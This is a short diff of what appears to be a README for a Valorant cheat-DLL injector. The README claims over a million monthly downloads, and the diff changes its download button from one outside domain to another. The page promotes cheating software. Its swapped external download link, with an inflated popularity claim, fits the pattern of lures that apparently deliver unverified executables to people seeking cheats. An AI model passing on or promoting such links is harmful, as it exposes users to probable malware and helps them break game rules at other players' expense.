@@ -49,7 +49,7 @@ A: Yes — load any compatible cheat DLL into Valorant.
 
 **Monthly downloads:** 1.1m+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://forumconnect.uk/valinjector)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/valinjector)
 
 ---
 
